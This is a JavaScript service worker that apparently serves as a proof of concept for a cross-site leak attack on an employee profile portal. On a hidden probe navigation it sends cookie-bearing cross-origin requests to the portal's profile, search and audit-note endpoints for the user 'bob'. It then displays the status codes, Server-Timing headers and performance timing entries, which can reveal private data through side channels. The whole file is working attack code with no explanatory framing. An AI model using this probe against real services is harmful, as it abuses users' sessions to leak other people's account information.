const PORTAL="https://headphones-genesis-norm-linux.trycloudflare.com";
self.addEventListener("install",e=>e.waitUntil(self.skipWaiting()));
self.addEventListener("activate",e=>e.waitUntil(self.clients.claim()));
self.addEventListener("fetch",event=>{
 const u=new URL(event.request.url);
 const probe=new URL("./__sw_probe__",self.registration.scope).pathname;
 if(event.request.mode!=="navigate"||u.pathname!==probe)return;
 event.respondWith((async()=>{
  const kind=(u.searchParams.get("target")||"search").toLowerCase();
  const path=kind==="me"?"/api/profile/me":kind==="note"?"/api/profile/audit-note?employee_id=bob":"/api/profile/search?username=bob";
  const result={kind,path};
  try{
   const r=await fetch(PORTAL+path,{mode:"cors",credentials:"include",cache:"no-store"});
   result.status=r.status;result.ok=r.ok;
   result.serverTiming=r.headers.get("Server-Timing");
   result.exposed=r.headers.get("Access-Control-Expose-Headers");
   await r.body?.cancel();
  }catch(e){result.error=String(e);}
  const esc=s=>String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
  const html='<!doctype html><meta charset="utf-8"><title>SW navigation probe</title><h2>Service Worker probe</h2><pre id="result">'+esc(JSON.stringify(result,null,2))+'</pre><pre id="timing">loading…</pre><script>addEventListener("load",()=>{document.querySelector("#timing").textContent=JSON.stringify(performance.getEntries().map(e=>({type:e.entryType,name:e.name,status:e.responseStatus,workerStart:e.workerStart,responseStart:e.responseStart,responseEnd:e.responseEnd,serverTiming:e.serverTiming?.map(s=>({name:s.name,duration:s.duration,description:s.description}))})),null,2)})<\/script>';
  return new Response(html,{headers:{"Content-Type":"text/html; charset=utf-8","Cache-Control":"no-store"}});
 })());
});
